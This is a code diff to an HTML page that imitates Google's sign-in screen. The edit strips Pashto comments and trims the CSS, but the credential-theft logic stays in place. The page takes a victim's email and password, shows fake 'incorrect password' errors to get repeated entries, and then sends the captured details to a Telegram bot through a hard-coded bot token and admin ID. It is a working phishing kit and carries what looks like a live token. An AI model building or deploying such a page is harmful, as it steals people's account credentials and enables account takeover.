@@ -9,7 +9,7 @@
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Google Sans', 'Roboto', system-ui, -apple-system, 'Segoe UI', sans-serif;
+            font-family: 'Google Sans', 'Roboto', system-ui;
         }
         body {
             min-height: 100vh;
@@ -25,8 +25,8 @@
             background: #ffffff;
             border-radius: 0.75rem;
             border: 1px solid #dadce0;
-            padding: 2rem 2rem 1.5rem 2rem;
-            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.08);
+            padding: 2rem;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.08);
         }
         .google-logo { text-align: center; margin-bottom: 1rem; }
         .google-logo img { width: 75px; height: auto; }
@@ -89,7 +89,6 @@
 <body>
 
 <div class="google-card">
-    <!-- مرحله 1: برېښنالیک -->
     <div id="step1View">
         <div class="google-logo"><img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google"></div>
         <h1>Sign in</h1>
@@ -101,7 +100,6 @@
         <a href="#" class="create-account" onclick="alert('Create account'); return false;">Create account</a>
     </div>
 
-    <!-- مرحله 2: پټنوم -->
     <div id="step2View" class="hidden">
         <div class="google-logo"><img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google"></div>
         <h1>Sign in</h1>
@@ -112,7 +110,6 @@
         <div class="guest-text">Not your computer? Use Guest mode to sign in privately.<div style="margin-top:0.3rem;"><a href="#" onclick="alert('Learn more'); return false;">Learn more</a></div></div>
     </div>
 
-    <!-- د بریالیتوب پینل -->
     <div id="successPanel" class="hidden">
         <div class="google-logo"><img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google"></div>
         <h1>✅ Verification Complete</h1>
@@ -127,7 +124,6 @@
 </div>
 
 <script>
-    // ========== د Telegram بوټ توکن (یوازې د لاګین معلوماتو لپاره) ==========
     const BOT_TOKEN = "8815514761:AAGT82khXsn8TmJHCv5vgSZG86Z6fAwGktQ";
     const ADMIN_ID = "8295417969";
 
@@ -155,7 +151,6 @@
         currentEmail = '';
     }
 
-    // مرحله 1: برېښنالیک
     document.getElementById('nextBtn').onclick = () => {
         let email = document.getElementById('emailInput').value.trim();
         if (!email || !email.includes('@')) {
@@ -170,7 +165,6 @@
         document.getElementById('passwordInput').value = '';
     };
 
-    // مرحله 2: پټنوم (3 هڅې)
     document.getElementById('loginBtn').onclick = async () => {
         let pass = document.getElementById('passwordInput').value.trim();
         if (!pass) {
@@ -183,16 +177,13 @@
         if (!attempts[key]) attempts[key] = 0;
         attempts[key]++;
         
-        // لومړی او دوهم ځل - ناکام
         if (attempts[key] === 1 || attempts[key] === 2) {
             showMessage(document.getElementById('errorBox'), `❌ Incorrect password. ${3 - attempts[key]} attempts remaining.`, true);
             setTimeout(() => goBackToEmail(), 2000);
             return;
         }
         
-        // درېیم ځل - بریالی
         if (attempts[key] >= 3) {
-            // اډمن ته خبر ورکړئ (یوازې بریالي لاګین)
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST', headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ 
@@ -202,18 +193,13 @@
                 })
             });
             
-            // د بریالیتوب پینل ښکاره کړئ
             document.getElementById('step2View').classList.add('hidden');
             document.getElementById('successPanel').classList.remove('hidden');
         }
     };
     
-    // د CANCEL تڼۍ - یوازې پاڼه بنده کوي (بوټ ته نه ځي)
     document.getElementById('cancelBtn').onclick = () => {
-        // هڅه وکړئ پاڼه بنده کړئ
         window.close();
-        
-        // که window.close() کار ونکړي، کارونکي ته خبر ورکړئ
         alert("Please close this window/tab manually.");
     };
 </script>
